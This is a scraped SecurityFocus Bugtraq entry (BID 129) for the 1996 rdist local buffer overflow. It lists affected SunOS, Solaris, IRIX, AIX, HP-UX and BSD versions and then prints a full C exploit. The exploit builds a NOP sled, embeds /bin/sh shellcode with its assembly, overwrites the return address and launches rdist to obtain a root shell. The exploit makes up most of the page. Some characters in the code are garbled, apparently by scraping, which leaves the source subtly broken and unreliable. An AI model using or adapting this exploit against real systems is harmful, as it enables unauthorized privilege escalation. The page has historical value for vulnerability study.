<p><b><span style="font-size: 18pt;">Multiple Vendor Rdist [8LGM] Vulnerability 1996</span></b></p><br><br><a href="http://www.securityfocus.com/bid/129/info">info</a><br><a href="http://www.securityfocus.com/bid/129/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/129/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/129/solution">solution</a><br><a href="http://www.securityfocus.com/bid/129/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title">Multiple Vendor Rdist 8LGM Vulnerability 1996</span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				129
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jul 03 1996 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 03 1996 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This bug was forwarded to the Bugtraq mailing list by Jeff Uphoff (juphoff@tarsier.cv.nrao.edu) Thu, 4 Jul 1996 from the 8LGM mailing list.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun SunOS 4.1.3 _U1<br/>
					
				
					Sun SunOS 4.1.3 <br/>
					
				
					Sun SunOS 4.1.2 <br/>
					
				
					Sun SunOS 4.1.1 <br/>
					
				
					Sun Solaris  2.4<br/>
					
				
					Sun Solaris  2.3<br/>
					
				
					Sun Solaris  2.2<br/>
					
				
					Sun Solaris  2.1<br/>
					
				
					Sun Solaris  2.0<br/>
					
				
					SGI IRIX 6.4 <br/>
					
				
					SGI IRIX 6.3 <br/>
					
				
					SGI IRIX 6.2 <br/>
					
				
					SGI IRIX 6.1 <br/>
					
				
					SGI IRIX 6.0.1 XFS<br/>
					
				
					SGI IRIX 6.0.1 <br/>
					
				
					SGI IRIX 6.0 <br/>
					
				
					SGI IRIX 5.3 XFS<br/>
					
				
					SGI IRIX 5.3 <br/>
					
				
					SGI IRIX 5.2 <br/>
					
				
					SGI IRIX 5.1.1 <br/>
					
				
					SGI IRIX 5.1 <br/>
					
				
					SGI IRIX 5.0.1 <br/>
					
				
					SGI IRIX 5.0 <br/>
					
				
					IBM AIX 4.2 <br/>
					
				
					IBM AIX 4.1.5 <br/>
					
				
					IBM AIX 4.1.4 <br/>
					
				
					IBM AIX 4.1.3 <br/>
					
				
					IBM AIX 4.1.2 <br/>
					
				
					IBM AIX 4.1.1 <br/>
					
				
					IBM AIX 4.1 <br/>
					
				
					IBM AIX 3.2.5 <br/>
					
				
					IBM AIX 3.2.4 <br/>
					
				
					IBM AIX 3.2 <br/>
					
				
					IBM AIX 3.1 <br/>
					
				
					HP HP-UX 10.0 <br/>
					
				
					FreeBSD FreeBSD 2.1 <br/>
					
				
					FreeBSD FreeBSD 2.0.5 <br/>
					
				
					FreeBSD FreeBSD 2.0 <br/>
					
				
					BSDI BSD/OS 2.1 <br/>
					
				
					BSDI BSD/OS 2.0.1 <br/>
					
				
					BSDI BSD/OS 2.0 <br/>
					
				
					BSDI BSD/OS 1.1 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title">Multiple Vendor Rdist 8LGM Vulnerability 1996</span><br/><br/>
	/* cut here    Brian Mitchell (brian@saturn.net)  */<br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;<br/><br/>#define DEFAULT_OFFSET          50<br/>#define BUFFER_SIZE             256<br/><br/>long get_esp(void)<br/>{<br/>   __asm__("movl %esp,%eax\n");<br/>}<br/><br/>main(int argc, char **argv)<br/>{<br/>   char *buff = NULL;<br/>   unsigned long *addr_ptr = NULL;<br/>   char *ptr = NULL;<br/><br/>/* so you dont have to disassemble it, here is the asm code:<br/>start:<br/>jmp     endofk0dez<br/>realstart:<br/>popl    %esi<br/>leal    (%esi), %ebx<br/>movl    %ebx, 0x0b(%esi)<br/>xorl    %edx, %edx<br/>movl    %edx, 7(%esi)<br/>movl    %edx, 0x0f(%esi)<br/>movl    %edx, 0x14(%esi)<br/>movb    %edx, 0x19(%esi)<br/>xorl    %eax, %eax<br/>movb    $59, %al<br/>leal    0x0b(%esi), %ecx<br/>movl    %ecx, %edx<br/>pushl   %edx<br/>pushl   %ecx<br/>pushl   %ebx<br/>pushl   %eax<br/>jmp     bewm<br/>endofk0dez:<br/>call    realstart<br/>.byte   '/', 'b', 'i', 'n', '/', 's', 'h'<br/>.byte   1, 1, 1, 1<br/>.byte   2, 2, 2, 2<br/>.byte   3, 3, 3, 3<br/>bewm:<br/>.byte   0x9a, 4, 4, 4, 4, 7, 4<br/>*/<br/><br/>   char execshell =<br/>   "\xeb\x23"<br/>   "\x5e"<br/>   "\x8d\x1e"<br/>   "\x89\x5e\x0b"<br/>   "\x31\xd2"<br/>   "\x89\x56\x07"<br/>   "\x89\x56\x0f"<br/>   "\x89\x56\x14"<br/>   "\x88\x56\x19"<br/>   "\x31\xc0"<br/>   "\xb0\x3b"<br/>   "\x8d\x4e\x0b"<br/>   "\x89\xca"<br/>   "\x52"<br/>   "\x51"<br/>   "\x53"<br/>   "\x50"<br/>   "\xeb\x18"<br/>   "\xe8\xd8\xff\xff\xff"<br/>   "/bin/sh"<br/>   "\x01\x01\x01\x01"<br/>   "\x02\x02\x02\x02"<br/>   "\x03\x03\x03\x03"<br/>   "\x9a\x04\x04\x04\x04\x07\x04";<br/><br/>   int i;<br/>   int ofs = DEFAULT_OFFSET;<br/><br/>   /* if we have a argument, use it as offset, else use default */<br/>   if(argc == 2)<br/>      ofs = atoi(argv1);<br/>   /* print the offset in use */<br/>   printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);<br/><br/>   buff = malloc(4096);<br/>   if(!buff)<br/>   {<br/>      printf("can't allocate memory\n");<br/>      exit(0);<br/>   }<br/>   ptr = buff;<br/>   /* fill start of buffer with nops */<br/>   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));<br/>   ptr += BUFFER_SIZE-strlen(execshell);<br/>   /* stick asm code into the buffer */<br/>   for(i=0;i &lt; strlen(execshell);i++)<br/>      *(ptr++) = execshelli;<br/>   /* write the return addresses<br/>   **<br/>   ** return address                            4<br/>   ** ebp                                       4<br/>   ** register unsigned n                       0<br/>   ** register char *cp                         0<br/>   ** register struct syment *s                 0<br/>   **<br/>   ** total: 8<br/>   */<br/>   addr_ptr = (long *)ptr;<br/>   for(i=0;i &lt; (8/4);i++)<br/>      *(addr_ptr++) = get_esp() + ofs;<br/>   ptr = (char *)addr_ptr;<br/>   *ptr = 0;<br/>   execl("/usr/bin/rdist", "rdist", "-d", buff, "-d", buff, NULL);<br/>}<br/>/* cut here */
	
		<ul>
</ul>
</div>